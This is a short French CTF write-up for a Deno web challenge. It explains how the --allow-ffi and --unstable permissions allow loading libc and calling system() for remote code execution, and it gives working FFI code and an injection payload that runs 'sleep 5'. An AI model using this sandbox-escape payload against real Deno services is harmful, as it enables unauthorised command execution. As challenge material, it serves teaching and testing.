# Writeup

Les permissions ont changé par rapport au premier challenge : 
- `--allow-ffi`
- `--unstable`
- `--allow-net=0.0.0.0:8086`
- `--allow-read=/app/astro_web_chall/dist/client/favicon.ico`

Il n'y a plus la permission qui permettait de lire le contenu du fichier avec le mot de passe de l'admin. Par contre, il y a le couple de permissions `-allow-ffi` et `--unstable` qui permet d'utiliser la fonctionnalité FFI de Deno. Cette fonctionnalité permet d'utiliser des librairies dynamiques à partir de Deno. La librairie `/lib/x86_64-linux-gnu/libc.so.6` est présente par défault et propose des fonctions intéressantes comme la fonction `system()` pour obtenir une RCE.

```
const libName = "/lib/x86_64-linux-gnu/libc.so.6";
const dylib = Deno.dlopen(libName, {
  "system": { parameters: ["buffer"], result: "isize" },
});
const buffer = new TextEncoder().encode("sleep 5");
dylib.symbols.system(buffer);
```

Payload : 

`green;let dylib = Deno.dlopen("/lib/x86_64-linux-gnu/libc.so.6", {"system": { parameters: ["buffer"], result: "isize" },});dylib.symbols.system(new TextEncoder().encode("sleep 5"));`

Liens : 
- https://medium.com/deno-the-complete-reference/calling-c-functions-from-deno-part-2-pass-buffers-ad168a3b6cc7
- https://guokeya.github.io/post/dEqQEWai4/
- https://deno.land/manual@v1.27.2/runtime/ffi_api